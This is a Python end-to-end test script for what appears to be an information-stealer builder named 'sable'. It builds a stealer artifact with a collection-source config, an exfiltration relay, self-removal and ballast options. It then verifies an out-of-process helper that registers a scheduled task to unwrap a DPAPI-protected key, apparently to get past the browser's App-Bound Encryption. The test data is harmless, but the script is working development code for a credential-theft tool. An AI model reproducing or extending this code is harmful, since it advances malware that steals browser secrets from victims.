"""The out-of-process unwrap, end to end, on a real artifact.

This drives the whole chain: register a one-shot task, run the artifact with the helper
flag, let the helper unwrap a DPAPI blob and write hex, read it back and reduce it to a
32-byte key. Only one thing is substituted — the task is registered as the current user
instead of SYSTEM, because registering a SYSTEM task needs elevation, and a test that
needs a UAC prompt is not a test.

That leaves exactly one line unproven: DPAPI opening a blob wrapped *by* SYSTEM. What it
does prove is everything this codebase wrote, including the part that was silently
broken — the helper re-execs the same image the main process is running, and the mutex
guard would refuse it as a second instance before it ever read its flag.

    python abe_check.py
"""

from __future__ import annotations

import ctypes
import json
import os
import secrets
import subprocess
import sys
import tempfile
import time
from ctypes import wintypes
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "sable"))

from agent import abe  # noqa: E402
from core import pipeline  # noqa: E402
from core.schema import (  # noqa: E402
    SOURCE_FIELDS,
    RelayConfig,
    RunConfig,
    SourceConfig,
)

LAUNCHER = ROOT / "sable" / "tools" / "dist" / "sable-launcher.exe"
SCHTASKS = Path(os.environ.get("SYSTEMROOT") or r"C:\Windows") / "System32" / "schtasks.exe"
RESULT_TIMEOUT = 90.0
MUTEX = r"Global\sable-abe-check"

# --- current-user DPAPI, the same call the browser makes -----------------------

_crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
_kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


_crypt32.CryptProtectData.argtypes = [
    ctypes.POINTER(DATA_BLOB),
    wintypes.LPCWSTR,
    ctypes.POINTER(DATA_BLOB),
    ctypes.c_void_p,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.POINTER(DATA_BLOB),
]
_crypt32.CryptProtectData.restype = wintypes.BOOL
_kernel32.LocalFree.argtypes = [ctypes.c_void_p]
_kernel32.CloseHandle.argtypes = [wintypes.HANDLE]


def protect(data: bytes) -> bytes:
    source = ctypes.create_string_buffer(data, len(data))
    plaintext = DATA_BLOB(len(data), ctypes.cast(source, ctypes.POINTER(ctypes.c_char)))
    wrapped = DATA_BLOB()
    if not _crypt32.CryptProtectData(
        ctypes.byref(plaintext), None, None, None, None, 0, ctypes.byref(wrapped)
    ):
        raise SystemExit(f"CryptProtectData failed: {ctypes.get_last_error()}")
    try:
        return ctypes.string_at(wrapped.pbData, wrapped.cbData)
    finally:
        _kernel32.LocalFree(ctypes.cast(wrapped.pbData, ctypes.c_void_p))


# --- an artifact to be the helper ----------------------------------------------


def build_artifact(work: Path) -> Path:
    """A build that collects nothing and talks to nobody, used only as an image.

    One source stays on because a build with none is refused, and the endpoint is a
    closed port, so if the helper flag were ever ignored the run would collect a machine
    summary and send nothing.
    """
    cfg = RunConfig(
        schema_version=1,
        mutex=MUTEX,
        seal_key="abe-check-key",
        relay=RelayConfig(kind="https", endpoint="http://127.0.0.1:1/"),
        sources=SourceConfig(**{name: name == "system" for name in SOURCE_FIELDS}),
        self_remove=False,
        ballast_mb=0,
    )
    outcome = pipeline.run(cfg, root=ROOT / "sable", out_dir=work, stub=LAUNCHER)
    return outcome.artifact


# --- schtasks, current user ----------------------------------------------------


def as_current_user(arguments: list[str]) -> list[str]:
    """``/ru SYSTEM /rl HIGHEST`` becomes ``/it``: no password, runs logged on."""
    if "/create" not in arguments:
        return arguments
    stripped: list[str] = []
    skip = False
    for item in arguments:
        if skip:
            skip = False
            continue
        if item in ("/ru", "/rl"):
            skip = True
            continue
        stripped.append(item)
    return [*stripped, "/it"]


def task_state(task: str) -> str:
    completed = subprocess.run(
        [str(SCHTASKS), "/query", "/tn", task, "/fo", "LIST", "/v"],
        capture_output=True,
        text=True,
        check=False,
    )
    for line in completed.stdout.splitlines():
        if "Last Result" in line:
            return line.split(":", 1)[1].strip()
    return "absent"


def main() -> int:
    if not LAUNCHER.is_file():
        print(f"{LAUNCHER} is missing; a real launcher is what this drives")
        return 1

    work = Path(tempfile.mkdtemp(prefix="sable-abe-"))
    artifact = build_artifact(work / "out")
    print(f"  artifact  {artifact.name}, {artifact.stat().st_size} bytes")

    real_schtasks = abe._schtasks
    rewrites: list[list[str]] = []

    def patched(arguments: list[str]) -> bool:
        rewritten = as_current_user(arguments)
        if rewritten != arguments:
            rewrites.append(rewritten)
        return real_schtasks(rewritten)

    frozen = getattr(sys, "frozen", None)
    executable = sys.executable
    wanted = secrets.token_bytes(32)
    workspace = abe._workspace()
    task = abe._task_name(workspace)

    # Hold the artifact's mutex for the whole unwrap. This is the production state: the
    # agent that asks for the key is the process holding the guard. Before the helper
    # was exempted, the re-exec was refused here as a second instance and wrote nothing.
    from agent import winapi

    holder, created = winapi.create_mutex(MUTEX)
    if not created:
        print(f"  mutex     {MUTEX} is already held by something else")
        return 1

    try:
        abe._schtasks = patched
        # ``_command_line`` branches on these two; setting them is how a non-frozen
        # process asks for the command line a frozen artifact would build.
        sys.frozen = True  # type: ignore[attr-defined]
        sys.executable = str(artifact)
        (workspace / abe._SOURCE_NAME).write_bytes(protect(wanted))
        got = abe.unwrap(protect(wanted))
    finally:
        abe._schtasks = real_schtasks
        if frozen is None:
            del sys.frozen  # type: ignore[attr-defined]
        else:
            sys.frozen = frozen  # type: ignore[attr-defined]
        sys.executable = executable
        _kernel32.CloseHandle(holder)

    started = time.monotonic()
    leftovers = task_state(task)
    print(f"  tasks     {len(rewrites)} registered as the current user")
    print(f"  leftover  {leftovers} after {time.monotonic() - started:.1f}s")
    print(f"  key       {'none' if got is None else f'{len(got)} bytes'}")

    failures: list[str] = []
    if got is None:
        failures.append("abe.unwrap returned None; the helper never wrote its result")
    elif got != wanted:
        failures.append("the helper returned a key that is not the one it was given")
    if not rewrites:
        failures.append("no task was registered at all")
    if leftovers not in ("absent", "0", "267011"):
        # 267011 is 0x41303, "task has not yet run" — a stale record, not a live task.
        failures.append(f"the task was not cleaned up (last result {leftovers})")

    if failures:
        print("\nFAILED")
        for line in failures:
            print("  -", line)
        print(f"\nwork: {work}")
        return 1

    print("\nheld: task registered, artifact re-exec'd with the flag, hex written,")
    print("      key reduced to 32 bytes, task deleted")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
